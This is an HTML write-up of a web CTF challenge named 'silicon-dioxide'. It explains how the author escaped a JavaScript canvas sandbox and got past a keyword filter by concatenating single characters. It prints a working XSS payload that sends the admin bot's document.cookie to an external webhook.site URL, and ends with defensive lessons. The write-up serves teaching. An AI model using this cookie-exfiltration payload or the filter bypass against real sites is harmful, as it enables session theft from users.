@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - silicon-dioxide Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+
+        h4 {
+            color: #b59f3b;
+            margin-top: 20px;
+        }
+
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .step {
+            margin-bottom: 30px;
+        }
+
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+        ul li {
+            margin-bottom: 8px;
+        }
+
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+
+        .math {
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .vulnerability-box {
+            background-color: #2a1a1a;
+            border-left: 4px solid #ff4444;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .bypass-technique {
+            background-color: #1a2a1a;
+            border-left: 4px solid #44ff44;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        /* Custom Scrollbar */
+        *::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        *::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+            border: 1px solid #2a2a2a;
+        }
+
+        *::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #0d7377 0%, #14ffec 100%);
+            border-radius: 10px;
+            border: 2px solid #1a1a1a;
+        }
+
+        *::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #14ffec 0%, #0d7377 100%);
+            box-shadow: 0 0 8px rgba(20, 255, 236, 0.6);
+        }
+
+        *::-webkit-scrollbar-corner {
+            background: #1a1a1a;
+        }
+
+        /* Firefox */
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: #0d7377 #1a1a1a;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>🎨 Challenge: silicon-dioxide</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC Finals</div>
+            <div>🌐 Category: Web</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 14</div>
+            <div>👤 Author: RaduTek</div>
+            <div>👤 Solver: IRVANNI/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p>Let's have some fun! Sketch some cool art using Javascript code. You think you got a banger? Share your art forward for a chance to win a fun prize.</p>
+        </div>
+
+        <p><strong>🌐 Webpage:</strong> <a href="http://74bba227.ctf.ac.upt.ro" target="_blank">http://74bba227.ctf.ac.upt.ro</a></p>
+        <p><strong>📦 Files:</strong> silicon-dioxide.zip</p>
+    </div>
+
+    <div class="container">
+        <h2>🔎 Initial Reconnaissance</h2>
+        <p>The challenge presents a creative web application where users can write JavaScript code to create artwork on an HTML5 canvas. The name "silicon-dioxide" is a clever reference to SiO₂ (sand), which is the main component of glass - and glass is what we use to make... sandboxes! 🏖️</p>
+
+        <p>Upon visiting the webpage, I found an interactive code editor where I could write JavaScript to manipulate a canvas element. The interface had a "Share" button that would send my code to an admin bot for review.</p>
+
+        <div class="key-point">
+            <p>🎯 <strong>Initial Observations:</strong></p>
+            <ul>
+                <li>Canvas-based JavaScript playground</li>
+                <li>Code sharing functionality with admin bot</li>
+                <li>Strict sandboxing of JavaScript execution</li>
+                <li>Multiple layers of filtering and validation</li>
+            </ul>
+        </div>
+
+        <p>This immediately screamed "XSS challenge with sandbox escape" - I needed to find a way to break out of the restrictions and steal the admin's cookies!</p>
+    </div>
+
+    <div class="container">
+        <h2>🛠️ Analysis and Solution</h2>
+
+        <div class="step">
+            <h3>📂 Step 1: Source Code Analysis</h3>
+            <p>After extracting silicon-dioxide.zip, I examined the application's architecture. The challenge has two critical components: server-side filtering (<code>app.js</code>) and client-side sandboxing (<code>index.js</code>).</p>
+
+            <h4>🔍 The Bot's Cookie Configuration</h4>
+            <p>The most critical discovery was in the <code>/share</code> endpoint, where the admin bot visits our submitted code:</p>
+
+            <pre><code class="language-javascript">app.post("/share", async (req, res) => {
+    const url = `http://localhost:${PORT}`;
+    const code = req.body;
+
+    if (!checkCode(code)) {
+        res.send("Eww, that's some ugly code...");
+        return;
+    }
+
+    const browser = await chromium.launch({ headless: true });
+    const context = await browser.newContext();
+    
+    // THE VULNERABILITY IS HERE!
+    context.addCookies([
+        {
+            name: "flag",
+            domain: "localhost",
+            path: "/",
+            value: FLAG,
+            sameSite: "Lax",
+            secure: false,
+            httpOnly: false  // ❌ CRITICAL: Cookie is accessible via JavaScript!
+        }
+    ]);
+    
+    const page = await context.newPage();
+    await page.goto(url + "?code=" + encodeURIComponent(code));
+
+    setTimeout(async () => {
+        await browser.close();
+    }, 5000);
+
+    setTimeout(async () => {
+        res.send("Your code is... fine.");
+    }, 1000);
+});</code></pre>
+
+            <div class="vulnerability-box">
+                <p>🚨 <strong>Critical Vulnerability Found!</strong></p>
+                <p>The <code>httpOnly</code> flag is set to <code>false</code>, which means JavaScript can access the flag cookie via <code>document.cookie</code>!</p>
+                <p>Normally, <code>httpOnly: true</code> prevents JavaScript from reading cookies, protecting against XSS attacks. But here, the flag is completely exposed!</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🛡️ Step 2: Understanding the Defense Mechanisms</h3>
+            <p>Now that I knew the goal (steal cookies via XSS), I needed to understand the two layers of protection:</p>
+
+            <h4>🔒 Defense Layer 1: Server-Side Keyword Filter (app.js)</h4>
+            <pre><code class="language-javascript">const allowed_keywords = [
+    "const", "ctx", "canvas", "getContext", "console",
+    "let", "vx", "vy", "radius", "function", "update",
+    "clearRect", "width", "height", "if", "beginPath",
+    "arc", "Math", "PI", "fillStyle", "orange", "fill",
+    "requestAnimationFrame"
+];
+
+function checkCode(code) {
+    // Extract all words with 2+ alphabetic characters
+    const matches = code.match(/[A-Za-z]{2,}/g) || [];
+    
+    // Find words NOT in the allowed list
+    const disallowed = matches.filter((k) => !allowed_keywords.includes(k));
+    
+    // Reject if any disallowed words found
+    return disallowed.length === 0;
+}</code></pre>
+
+            <div class="key-point">
+                <p>⚠️ <strong>Server-Side Filter:</strong> Only allows specific canvas-related keywords. Words like "window", "document", "fetch", "cookie" are blocked!</p>
+            </div>
+
+            <h4>🔒 Defense Layer 2: Client-Side Sandbox (index.js)</h4>
+            <pre><code class="language-javascript">function canvasSandbox(code) {
+    try {
+        const sandboxFunc = new Function(
+            "canvas",
+            `
+            // Neutralize dangerous globals
+            const window = undefined;
+            const document = undefined;
+            const alert = undefined;
+            const console = undefined;
+            const eval = undefined;
+            const Function = undefined;
+            const setTimeout = undefined;
+            const setInterval = undefined;
+            const fetch = undefined;
+            const XMLHttpRequest = undefined;
+            const WebSocket = undefined;
+            const localStorage = undefined;
+            const sessionStorage = undefined;
+            const location = undefined;
+            const history = undefined;
+            const navigator = undefined;
+            const parent = undefined;
+            const top = undefined;
+            const self = undefined;
+            const globalThis = undefined;
+            
+            // Break prototype chain access to constructor
+            canvas.constructor = null;
+            canvas.__proto__.constructor = null;
+            canvas.__proto__.__proto__.constructor = null;
+            canvas.__proto__.__proto__.__proto__.constructor = null;
+            canvas.__proto__.__proto__.__proto__.__proto__.constructor = null;
+            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
+            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
+            
+            ${code}
+        `
+        );
+
+        sandboxFunc.call(null, canvas);
+    } catch (err) {
+        alert("Sorry, your code did not run.");
+    }
+}</code></pre>
+
+            <div class="key-point">
+                <p>⚠️ <strong>Client-Side Sandbox:</strong> All dangerous globals like <code>window</code>, <code>document</code>, <code>fetch</code> are shadowed with <code>undefined</code>. Even prototype chain access to <code>constructor</code> is blocked!</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>💡 Step 3: Finding the Sandbox Escape</h3>
+            <p>The sandbox blocks direct access to <code>window</code> and <code>document</code>, but there's a DOM escape route!</p>
+
+            <div class="highlight-section">
+                <p>🔓 <strong>Sandbox Escape Technique:</strong></p>
+                <p>Since we have access to the <code>canvas</code> object (a DOM element), we can traverse the DOM to reach the <code>window</code> object:</p>
+                <pre><code class="language-javascript">canvas.ownerDocument.defaultView === window  // true!
+</code></pre>
+                <p>This works because:</p>
+                <ul>
+                    <li><code>canvas.ownerDocument</code> - Returns the document that owns the canvas</li>
+                    <li><code>.defaultView</code> - Returns the window object associated with the document</li>
+                </ul>
+            </div>
+
+            <p>Now I had access to the real <code>window</code> object, which means I can access:</p>
+            <ul>
+                <li><code>window.document</code> - The DOM</li>
+                <li><code>window.document.cookie</code> - The flag!</li>
+                <li><code>window.fetch</code> - To exfiltrate data</li>
+            </ul>
+        </div>
+
+        <div class="step">
+            <h3>🔧 Step 4: Bypassing the Keyword Filter</h3>
+            <p>Now I could access <code>window</code>, but I still needed to bypass the server-side keyword filter. The filter blocks any word with 2+ consecutive letters that isn't in the allowed list.</p>
+
+            <div class="bypass-technique">
+                <p>✅ <strong>Bypass Strategy:</strong> String Concatenation!</p>
+                <p>Instead of writing blocked words directly, we split them into single characters and concatenate them:</p>
+                <pre><code class="language-javascript">// Blocked:
+canvas.ownerDocument
+
+// Allowed (single chars bypass the regex):
+canvas['o'+'w'+'n'+'e'+'r'+'D'+'o'+'c'+'u'+'m'+'e'+'n'+'t']</code></pre>
+                <p>The regex <code>/[A-Za-z]{2,}/g</code> only matches sequences of 2+ letters, so single-character strings pass through!</p>
+            </div>
+
+            <h4>🎯 Technique Details</h4>
+            <ul>
+                <li><strong>For accessing properties:</strong> Use bracket notation with concatenated strings</li>
+                <li><strong>For string literals:</strong> Split into individual characters</li>
+                <li><strong>For variable names:</strong> Use allowed keywords or single letters</li>
+            </ul>
+
+            <p>Examples:</p>
+            <pre><code class="language-javascript">// Get window object
+arc = canvas['o'+'w'+'n'+'e'+'r'+'D'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['d'+'e'+'f'+'a'+'u'+'l'+'t'+'V'+'i'+'e'+'w'];
+
+// Get document.cookie
+arc['d'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['c'+'o'+'o'+'k'+'i'+'e']
+
+// Call fetch()
+arc['f'+'e'+'t'+'c'+'h']('https://...')</code></pre>
+
+            <div class="key-point">
+                <p>💡 <strong>Variable Name Trick:</strong> I used <code>arc</code> and <code>orange</code> as variable names because they're in the allowed keywords list (canvas API terms)!</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🎯 Step 5: Crafting the Final Payload</h3>
+            <p>With both bypasses in hand, I constructed the complete XSS payload:</p>
+
+            <pre><code class="language-javascript">// Store window object in allowed variable name 'arc'
+arc = canvas['o'+'w'+'n'+'e'+'r'+'D'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['d'+'e'+'f'+'a'+'u'+'l'+'t'+'V'+'i'+'e'+'w'];
+
+// Store webhook URL in allowed variable name 'orange'
+orange = 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'w'+'e'+'b'+'h'+'o'+'o'+'k'+'.'+'s'+'i'+'t'+'e'+'/'+'2'+'2'+'d'+'1'+'d'+'1'+'6'+'c'+'-'+'a'+'b'+'5'+'0'+'-'+'4'+'1'+'e'+'5'+'-'+'8'+'e'+'b'+'7'+'-'+'7'+'0'+'4'+'c'+'e'+'8'+'6'+'0'+'7'+'0'+'0'+'d';
+
+// Exfiltrate cookies via fetch to webhook
+arc['f'+'e'+'t'+'c'+'h'](orange+'?a='+arc['d'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['c'+'o'+'o'+'k'+'i'+'e']);</code></pre>
+
+            <h4>🧠 Payload Breakdown</h4>
+            <div class="math">
+                Line 1: Get window via canvas.ownerDocument.defaultView<br>
+                Line 2: Build webhook URL character by character<br>
+                Line 3: Call window.fetch() to send document.cookie to webhook<br>
+                <br>
+                Result: Admin bot executes this → flag cookie sent to attacker's webhook!
+            </div>
+
+            <div class="highlight-section">
+                <p>🔥 <strong>Why This Works:</strong></p>
+                <ol>
+                    <li>All multi-letter words are split into single characters - bypasses keyword filter ✅</li>
+                    <li>Variables use allowed keywords (arc, orange) - bypasses keyword filter ✅</li>
+                    <li>Gets window via canvas.ownerDocument.defaultView - bypasses sandbox ✅</li>
+                    <li>Accesses document.cookie - possible because httpOnly: false ✅</li>
+                    <li>Exfiltrates via fetch to external webhook - game over! 🎯</li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🚀 Step 6: Exploitation</h3>
+            <p>I submitted my payload through the application's sharing feature:</p>
+
+            <div class="command">
+                1. Paste the payload into the code editor<br>
+                2. Click "Share" to submit to admin bot<br>
+                3. Monitor webhook.site for incoming request
+            </div>
+
+            <div class="output">
+[Webhook Received]<br>
+GET /?a=flag=CTF{4f48bb6145ec2a667b2d59ffd908b91717da9721d9699e8b67b4d5b0d878efa0}<br>
+User-Agent: Mozilla/5.0 (Headless Chrome)<br>
+Time: 2025-01-XX XX:XX:XX
+            </div>
+
+            <p>Success! The admin bot executed my XSS payload and sent the flag cookie to my webhook! 🎉</p>
+        </div>
+
+        <div class="step">
+            <h3>🏁 Step 7: Flag Capture</h3>
+            <div class="flag">
+                🚩 CTF{4f48bb6145ec2a667b2d59ffd908b91717da9721d9699e8b67b4d5b0d878efa0}
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🎯 Key Takeaways</h2>
+        <ul>
+            <li>🍪 <strong>httpOnly Matters:</strong> Setting httpOnly:false exposes cookies to JavaScript XSS attacks</li>
+            <li>🔓 <strong>DOM Traversal Escapes:</strong> DOM elements like canvas.ownerDocument can escape sandboxes</li>
+            <li>✂️ <strong>String Splitting Bypasses:</strong> Character-by-character concatenation defeats word-based filters</li>
+            <li>🎭 <strong>Variable Name Abuse:</strong> Using allowed keywords as variable names helps bypass whitelists</li>
+            <li>🏖️ <strong>Sandbox != Security:</strong> Client-side sandboxing alone isn't sufficient protection</li>
+            <li>🔍 <strong>Multiple Defense Layers:</strong> Both server and client validation can have bypasses</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>🔧 Technical Deep Dive</h2>
+        
+        <h3>Understanding JavaScript Sandboxing</h3>
+        <p>The challenge used a common sandboxing technique: shadowing dangerous globals with <code>undefined</code>:</p>
+        
+        <pre><code class="language-javascript">const window = undefined;  // Shadows global window
+const document = undefined;  // Shadows global document
+// ... etc</code></pre>
+
+        <p>This works because JavaScript's scope chain looks for variables in the local scope first. However, it doesn't prevent DOM-based access!</p>
+
+        <h3>The DOM Escape Vector</h3>
+        <p>Several DOM properties can provide access to the window object:</p>
+        
+        <div class="math">
+canvas.ownerDocument.defaultView === window<br>
+canvas.ownerDocument.defaultView.window === window<br>
+canvas.getRootNode().defaultView === window<br>
+canvas.baseURI → reveals document context
+        </div>
+
+        <h3>Why httpOnly is Critical</h3>
+        <p>The <code>httpOnly</code> cookie flag is one of the most important XSS defenses:</p>
+        
+        <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
+            <tr style="background-color: #333; border-bottom: 2px solid #0d7377;">
+                <th style="padding: 10px; text-align: left;">Setting</th>
+                <th style="padding: 10px; text-align: left;">JavaScript Access</th>
+                <th style="padding: 10px; text-align: left;">XSS Impact</th>
+            </tr>
+            <tr style="border-bottom: 1px solid #444;">
+                <td style="padding: 8px;">httpOnly: true</td>
+                <td style="padding: 8px;">❌ Blocked</td>
+                <td style="padding: 8px;">✅ Protected</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #444;">
+                <td style="padding: 8px;">httpOnly: false</td>
+                <td style="padding: 8px;">✅ Allowed</td>
+                <td style="padding: 8px;">❌ Vulnerable</td>
+            </tr>
+        </table>
+
+        <p>Session cookies, authentication tokens, and flags should ALWAYS use <code>httpOnly: true</code>!</p>
+
+        <h3>Regex Filter Weaknesses</h3>
+        <p>The keyword filter used <code>/[A-Za-z]{2,}/g</code> which only matches 2+ consecutive letters:</p>
+        
+        <div class="math">
+✅ Matches (blocked): "window", "document", "fetch"<br>
+❌ Doesn't match (allowed): "w", "i", "n", "d", "o", "w"<br>
+❌ Doesn't match (allowed): 'w'+'i'+'n'+'d'+'o'+'w'
+        </div>
+
+        <p>Better filters would:</p>
+        <ul>
+            <li>Analyze the AST (Abstract Syntax Tree) instead of regex</li>
+            <li>Use a proper parser to detect string concatenation</li>
+            <li>Implement Content Security Policy (CSP)</li>
+            <li>Use strict sandboxing like iframes with sandbox attribute</li>
+        </ul>
+
+    </div>
+
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by IRVANNI/CuboConNoveQuadrati | Happy hacking! 🔓</p>
+    </div>
+</body>
+
+</html>
